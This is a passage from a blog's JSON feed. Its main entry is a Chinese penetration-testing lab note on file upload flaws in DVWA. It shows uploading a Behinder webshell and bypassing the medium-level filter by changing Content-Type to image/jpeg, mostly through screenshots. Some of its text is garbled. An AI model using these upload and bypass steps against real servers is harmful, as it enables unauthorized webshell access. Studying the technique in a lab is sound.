            "date_published": "2020-09-09T11:42:47.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/Web/WarmUp/",
            "url": "http://example.com/2020/09/09/Web/WarmUp/",
            "title": "WarmUp",
            "date_published": "2020-09-09T11:42:13.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/",
            "url": "http://example.com/2020/09/09/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/",
            "title": "文件上传渗透攻击及防御",
            "date_published": "2020-09-09T10:56:49.000Z",
            "content_html": "<h2 id=\"文件上传漏洞原理\"><a class=\"anchor\" href=\"#文件上传漏洞原理\">#</a> 文件上传漏洞原理</h2>\n<h4 id=\"实验环境\"><a class=\"anchor\" href=\"#实验环境\">#</a> 实验环境：</h4>\n<p>目标靶机：OWASP_Broken_Web_Apps_VM_1.2</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdHMvb3dhc3Bid2EvZmlsZXMvMS4yL09XQVNQX0Jyb2tlbl9XZWJfQXBwc19WTV8xLjIuN3ovZG93bmxvYWQ=\">https://sourceforge.net/projects/owaspbwa/files/1.2/OWASP_Broken_Web_Apps_VM_1.2.7z/download</span></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>OWASP Broken Web Applications Project</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Broken Web Applications<span class=\"token punctuation\">(</span>BWA<span class=\"token punctuation\">)</span> 项目生成一个虚拟机，运行各种具有已知漏洞的应用程序，供以下人员使用：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>- 了解Web应用程序安全性</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>- 测试手册评估技术</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>- 测试自动化工具</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>- 测试源代码分析工具</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>- 观察网络攻击</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>- 测试WAF和类似的代码技术</pre></td></tr></table></figure><p>测试渗透机：Kali-Linux</p>\n<h4 id=\"实验原理\"><a class=\"anchor\" href=\"#实验原理\">#</a> 实验原理：</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span>、文件上传<span class=\"token punctuation\">(</span>File Upload ）是大部分webl应用都具备的功能，例如用户上传阳件、修改头像、分享图片/视频等</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2</span>正常的文件一船是义档、图片、视频等，wMeb应用收集之后战入后台存储，需要的时候再调用出来返回</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3</span>、如果恶意文件如PHP、ASP等执行文件绕过web应用，并藏利执行，则相当于黑客直接拿到了webshell</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4</span>、一旦黑客拿到Mebshell，则可以拿至Mebsi用8款据，制除web文件，本地提权，进一步拿下整个苇务器甚至内网</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">5</span>、SQL注入攻击的对象是数据库服务，文件上传漏洞主要攻击wleb版务，实际渗透两利相合，达到对目标的深度控制</pre></td></tr></table></figure><h4 id=\"实验过程\"><a class=\"anchor\" href=\"#实验过程\">#</a> 实验过程：</h4>\n<h5 id=\"实验一\"><a class=\"anchor\" href=\"#实验一\">#</a> 实验一：</h5>\n<p>通过 DVWA 中 low 难度的文件上传漏洞获得 shell</p>\n<p>运行靶机 OWASP_Broken_Web_Apps_VM_1.2</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910093745711.png\" alt=\"image-20200910093745711\" /></p>\n<p>根据上方提示 username=root and password = owaspbwa 登录</p>\n<p>打开谷歌浏览器访问上方提示 IP 连接</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguNzMuMjMw\">http://192.168.73.230</span></p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910094053721.png\" alt=\"image-20200910094053721\" /></p>\n<p>点击 Damn Vulnerable Web Application</p>\n<p>用户名密码均为 admin</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910094207181.png\" alt=\"image-20200910094207181\" /></p>\n<p>打开 Upload 测试文件上传</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910095925519.png\" alt=\"image-20200910095925519\" /></p>\n<p>选择冰蝎中的 shell.php 文件进行上传</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910100336147.png\" alt=\"image-20200910100336147\" /></p>\n<p>打开冰蝎 2.0 新增连接</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910100505046.png\" alt=\"image-20200910100505046\" /></p>\n<p>点击保存，双击运行即可发现已成功</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910100611806.png\" alt=\"image-20200910100611806\" /></p>\n<h5 id=\"实验二\"><a class=\"anchor\" href=\"#实验二\">#</a> 实验二：</h5>\n<p>通过 DVWA 中 medium 难度的文件上传漏洞获得 shell</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910100912878.png\" alt=\"image-20200910100912878\" /></p>\n<p>通过此处将难度改为 medium</p>\n<p>再次进行 Upload 操作</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910101005019.png\" alt=\"image-20200910101005019\" /></p>\n<p>发现上传 shell.php 失败</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910101050300.png\" alt=\"image-20200910101050300\" /></p>\n<p>点击下方查看源码发现上传进行了过滤</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910101139696.png\" alt=\"image-20200910101139696\" /></p>\n<p>我们可以通过 BP 来拦截请求进行绕过</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910102133228.png\" alt=\"image-20200910102133228\" /></p>\n<p>抓到上传的请求包将 Content-Type 改成 image/jpeg</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910102241997.png\" alt=\"image-20200910102241997\" /></p>\n<p>即可完成绕过</p>\n<p>运用冰蝎连接 shell.php 获得 shell</p>\n<p><img data-src=\"https://raw.githubusercontent.com/gingermou/jiang/images/Typora/img/image-20200910102628120.png\" alt=\"image-20200910102628120\" /></p>\n",
            "tags": []
        }
    ]
}